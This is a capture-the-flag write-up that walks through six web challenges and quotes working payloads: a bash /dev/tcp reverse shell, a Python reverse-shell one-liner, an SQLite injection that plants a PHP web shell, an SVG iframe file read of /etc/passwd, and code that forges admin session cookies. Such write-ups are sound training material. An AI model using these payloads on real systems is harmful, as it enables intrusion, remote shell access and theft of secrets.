# Web Challenges
---
## Kryptos Support
*The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?*

Checking the web page of Kryptos Support gives a form to send a report issue regarding the Kryptos Vault. There's also a Backend link that redirects to a login page.

![[Pasted image 20220517171441.png]]

Login Page:

![[Pasted image 20220517171725.png]]

Testing the functionality of sending an issue gives a response that **'An admin will review your ticket shortly!'**

This is interesting as there will be a user interaction on the admin side of this functionality. This means that we can try blind XSS payload to get the admin cookie and bypass the login functionality.

![[Pasted image 20220517171551.png]]

Injecting blind XSS payload to get cookie.

![[Pasted image 20220517172535.png]]

Successfully got the cookie.
![[Pasted image 20220517172604.png]]
However, upon visiting /login it didn't redirect us to the admin page.

I used gobuster to search for more directory on the webpage and I got **/tickets** and **/settings**.
![[Pasted image 20220517173040.png]]

Visiting **/settings** gives us the functionality to change the password. Let's check in burpsuite how the server is processing the change password.

Change password:

![[Pasted image 20220517173559.png]]

Request:

![[Pasted image 20220517173613.png]]

Response:

![[Pasted image 20220517173621.png]]

The request has a parameter '**uid**' and we can try to test for IDOR and change the '**uid**' to 1 to change the password that account.

![[Pasted image 20220517173804.png]]

We have changed the password of the admin and now let's try to login using that password.

![[Pasted image 20220517173912.png]]

We got the flag.

![[Pasted image 20220517173924.png]]

<br>

---
## BlinkerFluids
*Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?*

Checking the web page of Blinker Fluids gives a functionality to **'Create New Invoice'**.

![[Pasted image 20220517181840.png]]

The web application uses MD (Markdown) to create an invoice.

![[Pasted image 20220517182125.png]]

With this challenge we are given the source code. Let's try to check the source code and check how the web application process the MD.

The application uses `MDHelper.makePDF(markdown_content)` function to generate a pdf from markdown.

![[Pasted image 20220517182306.png]]

By checking the `MDHelper.js` it is using the **'md-to-pdf'** node module.

![[Pasted image 20220517182351.png]]

After googling some CVE on the said module. I found that there is a POC from Synk.
[Synk Vulnerability DB: CVE-2021-23639](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880)

![[Pasted image 20220517182534.png]]

After testing the payload after escaping the double quotes (\\") it says that **'something went wrong!'**

![[Pasted image 20220517182732.png]]

I tried to look for other payloads and found this.

![[Pasted image 20220517182822.png]]

The difference is that the 'n' is actually a new line, so I tried this payload and it works.

![[Pasted image 20220517183024.png]]

I changed the payload to get a reverse shell.
Payload:
1) Create shell.sh that contains revershell.
`bash -i >& /dev/tcp/yourserverip/port 0>&1`
2) Listen for http traffic.
`python3 -m http.server 80`
3) Use payload below:

![[Pasted image 20220517183828.png]]

reverse shell:

![[Pasted image 20220517184116.png]]

flag:

![[Pasted image 20220517184149.png]]

<br>

---
## Amidst Us
*The AmidstUs tribe is a notorious group of sleeper agents for hire. We have plausible reasons to believe they are working with Draeger, so we have to take action to uncover their identities. Ulysses and bonnie have infiltrated their HQ and came across this mysterious portal on one of the unlocked computers. Can you hack into it despite the low visibility and get them access?*

Checking the web page of Amidst Us gives a functionality to upload an image and have a response on the same image with different color.

![[Pasted image 20220517201333.png]]

![[Pasted image 20220517202002.png]]


With this challenge we are given the source code. Let's try to check the source code and check how the web application process the image.

Upon checking the source code it is a python application that uses PIL as imaging library.

The function from **routes.py** calling the function **make_alpha(request.json)** from **util.py**.

![[Pasted image 20220517203726.png]]

The **make_alpha** function was using **ImageMath.eval()** that has a CVE.
[Synk Vulnerability DB: CVE-2022-22817](https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901)

![[Pasted image 20220517203940.png]]

Injecting the payload in **background** parameter as it is being evaluated in ImageMath.eval() function.

Reverse Shell Python Payload:

```python
socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

Full payload below:

Request:

![[Pasted image 20220517204211.png]]

Got a reverse shell.

![[Pasted image 20220517204411.png]]

Got the flag.

![[Pasted image 20220517204426.png]]

<br>

---
## Intergalactic Post
*The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie's sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry?*

Checking the web page of Intergalactic Post gives a form to subscribe to the newsletter.

![[Pasted image 20220517185342.png]]

Upon testing the functionality it only tell us that we are now subscribed.

![[Pasted image 20220517185445.png]]

With this challenge we are given the source code. Let's try to check the source code and check how the web application process the subscribe functionality.

SubsController.php

![[Pasted image 20220517185640.png]]

Upon checking the source code it has a validation of the email form and submit it to subscribe function.

Checking the **SubscriberModel.php** shows how it handles the form. It also get the headers **(X-Forwarded-For, remote-addr, and client-ip)** if it exists. Getting the value of this headers doesn't have any filtering/validation on it, so we can do an SQL injection on this header.

![[Pasted image 20220517185800.png]]

I first checked the **'Dockerfile'** to see where the flag is located. It has a random value of file name so there's no way we can try to load the file using SQL injection. Instead we can try to get an RCE. Also, the directory of the web application is in /www.

![[Pasted image 20220517190130.png]]

SQLite3 RCE Payload:

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>"); --
```

Injecting SQLi Payload:

![[Pasted image 20220517190444.png]]

Let's now try to visit **'lol.php?cmd=id'** to check if our payload works.

![[Pasted image 20220517190529.png]]

We now have an RCE, let's try to read the flag.

![[Pasted image 20220517190556.png]]
![[Pasted image 20220517190632.png]]

<br>

---
## Mutation Lab
*One of the renowned scientists in the research of cell mutation, Dr. Rick, was a close ally of Draeger. The by-products of his research, the mutant army wrecked a lot of havoc during the energy-crisis war. To exterminate the leftover mutants that now roam over the abandoned areas on the planet Vinyr, we need to acquire the cell structures produced in Dr. Rick's mutation lab. Ulysses managed to find a remote portal with minimal access to Dr. Rick's virtual lab. Can you help him uncover the experimentations of the wicked scientist?*

Checking the web page of Mutation Lab gives a login/register page.

![[Pasted image 20220517162556.png]]

After logging in, there was a functionality to **'Export Cell Structure'** and **'Export TadPole Samples'**.

![[Pasted image 20220517162806.png]]

At the bottom there's a note saying **'Only lab admins is allowed to view the confidential records'**. This is interesting as I think we need to get to the admin page to get the flag.

![[Pasted image 20220517162853.png]]

Using Burpsuite to proxy traffic to test the **'Export Cell Structure'** and **'Export TadPole Examples'** gives me this request and response.

Request:

![[Pasted image 20220517163133.png]]

Response:

![[Pasted image 20220517163144.png]]

The functionality is giving the server an SVG and the server giving a response of PNG.  There might be something that processing the SVG to convert to PNG.
SVG is also interesting as we can include an XXE payload inside the SVG.

Testing basic payload of XXE over SVG.

Payload:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

> Use CyberChef to escape double quotes of the payload.

Request:

![[Pasted image 20220517164923.png]]

Upon checking the response it only gives me this:

![[Pasted image 20220517165020.png]]

Our payload didn't work as there might be some filtering/validation happening on the server side.

I tried injecting basic XXE payload without SVG to see how the server process this payload. It gives me an error and saw that the server is using **convert-svg-core** from node modules.

Request:

![[Pasted image 20220517165352.png]]

Response:

![[Pasted image 20220517165419.png]]

I google convert-svg-core CVE and found that there was a POC from Synk.
[Snyk Vulnerability DB: CVE-2021-23631](https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785)

![[Pasted image 20220517165616.png]]

I copied the payload and check if its working.

Payload:

```xml
<svg-dummy></svg-dummy> <iframe src="file:///etc/passwd" width="100%" height="1000px"></iframe> <svg viewBox="0 0 240 80" height="1000" width="1000" xmlns="http://www.w3.org/2000/svg"> <text x="0" y="0" class="Rrrrr" id="demo">data</text> </svg>
```

Request:

![[Pasted image 20220517165754.png]]

Response:

![[Pasted image 20220517165745.png]]

We now have directory traversal and can iframe the contents of the file system.

By checking the error above we know that the application path is in '/app/index.js'.

![[Pasted image 20220517170009.png]]

We can see that there's a **SESSION_SECRET_KEY** on the /app/.env this is interesting as we can use this forge session cookie to gain admin account.

index.js:

![[Pasted image 20220517170104.png]]

.env:

![[Pasted image 20220517170356.png]]

Upon checking our current session cookie, we can tamper the username to be 'admin' and forge a session using the secret key.

Cookie:

![[Pasted image 20220517170527.png]]
Base64 Decode:

![[Pasted image 20220517170544.png]]

I used this code to generate our session with admin username and sign the cookie with the secret key.

```javascript
var cookieSession = require('cookie-session')
var express = require('express')

var app = express()

app.set('trust proxy', 1) // trust first proxy

app.use(cookieSession({
  name: 'session',
  keys: ['5921719c3037662e94250307ec5ed1db']
}))

app.get('/', function (req, res, next) {
  // Update views
  req.session.username = 'admin';

  res.send('test');

})

app.listen(3000)
```

We now have the admin session and session.sig:

![[Pasted image 20220517170904.png]]

Paste the value on mutation lab and access /dashboard to get the flag.

![[Pasted image 20220517171044.png]]

<br>

---
## Genesis Wallet
>*This write up was solved using the unintended way.*

*To weaken the Golden Fang army, we must cut off their funding of the Genesis coins. Ulysses managed to perform a phishing attack against one of the financial operators of the mercenary and retrieved the login credentials "icarus:FlyHighToTheSky" for the Genesis wallet. However, the account is protected with 2FA. Can you hack into this renowned intergalactic wallet and move their funds to your account?*

Checking the web page of Genesis Wallet gives us log in and sign up page.

![[Pasted image 20220519185500.png]]

I signed up and log in to the genesis wallet and it prompt me for 2fa.

![](Pasted%20image%2020220519190238.png)

I used google authenticator for 2fa.

Upon logging in we can see that we have the ability to send / receive and viewing transactions.

![[Pasted image 20220519190539.png]]

Reviewing the source code reveals us that the user icarus has a wallet address with md5 of its username and has a balance of 1337.10 GTC.

![[Pasted image 20220519190815.png]]

The goal for intended way was to bypass 2fa of user icarus and transfer to us his GTC and that will show us the flag.

![[Pasted image 20220519191048.png]]

Unfortunately, the code doesn't check/validate if the user input a negative value when sending GTC. This is an application logic vulnerability.

![[Pasted image 20220519191303.png]]

The source code when sending a GTC only checks if the amount we are sending is greater than our balance.

`user.balance > amount`

If we send a negative value it will pass that check because our current balance is greater than the amount we are sending and it will do the math and return us our new balance. 

With this logic flaw we can have an infinite amount of GTC because subtracting a negative value to a positive value will total the value.

Reference:

![[Pasted image 20220519192020.png]]

We can now send 1337 GTC to any other address and it will add it to our balance and reflect the flag. We can send to any other wallet address as long as its md5.

![[Pasted image 20220519193257.png]]

After sending the GTC checking the /dashboard and it should reflect the flag.

![[Pasted image 20220519193458.png]]

![[Pasted image 20220519193506.png]]




